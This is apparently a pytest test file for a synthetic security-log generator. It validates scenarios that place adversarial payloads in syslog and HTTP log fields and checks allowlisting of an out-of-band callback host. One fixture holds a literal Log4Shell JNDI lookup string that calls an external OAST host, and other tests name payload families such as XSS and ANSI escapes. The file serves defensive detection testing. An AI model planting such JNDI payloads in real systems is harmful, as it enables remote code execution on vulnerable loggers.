    def test_windows_syslog_surface_is_error(self):
        errs = _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "syslog_message",
                        "family": "ansi_escape",
                    }
                ],
                actor_os="Windows 11 Pro",
            )
        )
        assert any("Linux-modeled" in m for m in errs)

    def test_missing_surface_format_is_error(self):
        errs = _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "syslog_message",
                        "family": "ansi_escape",
                    }
                ],
                logs=[{"format": "ecar"}],
            )
        )
        assert any("needs output format 'syslog'" in m for m in errs)

    def test_http_surface_without_web_server_is_error(self):
        errs = _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "http_request_url",
                        "family": "xss_reflection",
                    }
                ],
                logs=[{"format": "web_access"}],
            )
        )
        assert any("role 'web_server'" in m for m in errs)

    def test_http_surface_with_web_server_validates_clean(self):
        assert not _errors(
            _linux_scenario(
                [
                    {
                        "type": "adversarial_payload",
                        "surface": "http_referrer",
                        "family": "log4shell",
                    }
                ],
                logs=[{"format": "web_access"}],
                web_server=True,
            )
        )

    def test_scheme_incompatible_web_server_is_error(self):
        # scheme:https requested but the only web server is HTTP-only → the payload
        # would be labeled but never emitted (phantom) → validation error.
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_request_url",
                    "family": "log4shell",
                    "scheme": "https",
                }
            ],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        scenario["environment"]["systems"][1]["services"] = ["http"]
        assert any("compatible with scheme 'https'" in m for m in _errors(scenario))

    def test_scheme_compatible_web_server_validates_clean(self):
        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "http_request_url",
                    "family": "log4shell",
                    "scheme": "http",
                }
            ],
            logs=[{"format": "web_access"}],
            web_server=True,
        )
        scenario["environment"]["systems"][1]["services"] = ["http"]
        assert not _errors(scenario)

    @pytest.mark.parametrize("actor_os", ["macOS 14", "FreeBSD 14", "Windows 10"])
    def test_linux_only_surface_on_non_linux_host_rejected(self, actor_os):
        # Regression: the Linux-only-surface gate must reject ANY non-Linux host (Windows
        # OR an unknown OS such as macOS/BSD), not just Windows. Otherwise syslog_message on
        # a macOS/BSD actor validates clean but is dropped at emit -> a phantom-positive
        # ground-truth label. A Linux host is present so the 'syslog' format has a valid
        # home, isolating the OS-gate error.
        scenario = _linux_scenario(
            [{"type": "adversarial_payload", "surface": "syslog_message", "family": "ansi_escape"}],
            actor_os=actor_os,
        )
        scenario["environment"]["systems"].append(
            {
                "hostname": "LIN-AUX",
                "ip": "192.168.20.99",
                "os": "Ubuntu 22.04 LTS",
                "type": "server",
            }
        )
        msgs = _errors(scenario)
        assert any("Linux-modeled" in m and "not Linux" in m for m in msgs), (actor_os, msgs)


class TestAdversarialPayloadValidateCLI:
    def test_good_fixture_exit_zero(self, scenarios_dir):
        result = runner.invoke(app, ["validate", str(scenarios_dir / "adversarial_payload.yaml")])
        assert result.exit_code == 0

    def test_bad_payload_exit_two(self, tmp_path):
        import yaml

        bad = tmp_path / "bad.yaml"
        bad.write_text(
            yaml.safe_dump(
                _linux_scenario(
                    [{"type": "adversarial_payload", "surface": "syslog_message", "family": "nope"}]
                )
            )
        )
        assert runner.invoke(app, ["validate", str(bad)]).exit_code == 2

    def _write_literal_oob_scenario(self, tmp_path) -> Path:
        import yaml

        scenario = _linux_scenario(
            [
                {
                    "type": "adversarial_payload",
                    "surface": "syslog_message",
                    "value": "EFORGE_TEST ${jndi:ldap://abc.oast.fun/EFORGE_TEST}",
                }
            ]
        )
        path = tmp_path / "literal_oob.yaml"
        path.write_text(yaml.safe_dump(scenario))
        return path

    def test_validate_literal_oob_rejected_without_oob_host(self, tmp_path):
        # A literal value pointing at an operator OOB host is a non-allowlisted host by
        # default, so standalone validate flags it as a cross-reference error (exit 2).
        path = self._write_literal_oob_scenario(tmp_path)
        assert runner.invoke(app, ["validate", str(path)]).exit_code == 2

    def test_validate_literal_oob_accepted_with_oob_host(self, tmp_path):
        # Parity with `generate --oob-host`: registering the host allowlists it so the same
        # scenario validates clean (exit 0).
        path = self._write_literal_oob_scenario(tmp_path)
        result = runner.invoke(app, ["validate", str(path), "--oob-host", "abc.oast.fun"])
        assert result.exit_code == 0

    def test_validate_oob_host_rejects_malformed_fast(self, tmp_path):
        # The validate --oob-host contract is identical to generate's: a non-bare value is
        # rejected at the boundary (exit 1) before the scenario is loaded.
        path = self._write_literal_oob_scenario(tmp_path)
        result = runner.invoke(app, ["validate", str(path), "--oob-host", "http://x/y"])
        assert result.exit_code == 1
        assert "bare host" in result.output.lower()

    def test_validate_oob_host_rejects_non_registrable_fast(self, tmp_path):
        path = self._write_literal_oob_scenario(tmp_path)
        result = runner.invoke(app, ["validate", str(path), "--oob-host", "com"])
        assert result.exit_code == 1
        assert "registrable" in result.output.lower()

    def test_generate_oob_host_alone_enables_live_callback(self, scenarios_dir, tmp_path):
        # --oob-host is now the explicit opt-in (no separate --i-am-authorized flag): it is
        # accepted on its own and prints the loud LIVE CALLBACK MODE warning.
        result = runner.invoke(
            app,
            [
                "generate",
                str(scenarios_dir / "adversarial_payload.yaml"),
                "-f",
                "--output",
                str(tmp_path / "oob"),
                "--oob-host",
                "abc.oast.fun",
            ],
        )
        assert result.exit_code == 0
        assert "live callback mode" in result.output.lower()

    @pytest.mark.parametrize(
        "bad_host",
        ["http://127.0.0.1", "127.0.0.1/evil", "sink.local:8080", "user@sink.local", "a b"],
    )
    def test_generate_oob_host_rejects_malformed_fast(self, scenarios_dir, bad_host):
        # A non-bare --oob-host (scheme/path/port/userinfo/whitespace) must be rejected at
        # the boundary with a clear message — never crash mid-generation. Fail fast =
        # input error (exit 1), and the registration message, BEFORE any generation.
        result = runner.invoke(
            app,
            [
                "generate",
                str(scenarios_dir / "adversarial_payload.yaml"),
                "-f",
                "--oob-host",
                bad_host,
            ],
        )
        assert result.exit_code == 1
        assert "bare host" in result.output.lower()
        assert "generation complete" not in result.output.lower()

    @pytest.mark.parametrize("bad_host", ["com", "fun", "local", "co.uk", "ac.uk"])
    def test_generate_oob_host_rejects_non_registrable_fast(self, scenarios_dir, bad_host):
        # A bare TLD / single label or a public suffix is too broad — it would allowlist an
        # entire namespace. Reject at the boundary (exit 1) with the registrable-domain
        # message, BEFORE any generation.
        result = runner.invoke(
            app,
            [
                "generate",
                str(scenarios_dir / "adversarial_payload.yaml"),
                "-f",
                "--oob-host",
                bad_host,
            ],
        )
        assert result.exit_code == 1
        assert "registrable" in result.output.lower()
        assert "generation complete" not in result.output.lower()
